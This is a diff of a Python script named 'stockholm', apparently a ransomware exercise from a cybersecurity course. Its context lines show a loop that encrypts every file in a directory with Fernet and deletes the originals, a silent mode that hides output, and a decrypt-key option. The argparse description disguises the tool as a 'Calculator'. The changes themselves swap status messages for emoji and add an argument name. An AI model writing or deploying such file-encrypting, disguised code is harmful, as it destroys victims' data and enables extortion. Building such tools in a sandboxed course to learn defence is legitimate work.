@@ -30,7 +30,7 @@ def encrypt_loop(dir_path: str, f: Fernet):
                             f_out.write(f.encrypt(raw_data))
                         remove(file)
                         if is_silent == False:
-                            print('encrypted: [ ' + file + ' ] ---> [ ' + new_file + ' ]')
+                            print('[ 💥💣💀 ] ' + file)
                         break
                     except Exception as e:
                         if is_silent == False:
@@ -54,7 +54,7 @@ def decrypt_loop(dir_path: str, f: Fernet):
                         f_out.write(recovered_data)
                     remove(file)
                     if is_silent == False:
-                        print('decrypted: [ '  + decrypted_file + ' ] <--- [ '  + file + ' ]')
+                        print('[ 🏞 ️🌸️😎 ] ' + decrypted_file)
                     break
                 except Exception:
                     pass
@@ -71,7 +71,8 @@ def main() -> int:
     parser = argparse.ArgumentParser(description='Calculator: used for calculations')
 
     parser.add_argument('-v', '--version', help='shows version', action='version', version='stockholm:madrid_cybersecurity, v0.0.1')
-    parser.add_argument('-r', '--reverse', type=str, help='reverse encryption')
+    parser.add_argument('-r', '--reverse', type=str, help='reverse encryption',
+                         metavar=('DECRYPT_KEY'))
     parser.add_argument('-s', '--silent', help='does not show output', action='store_true')
     args = parser.parse_args()
 
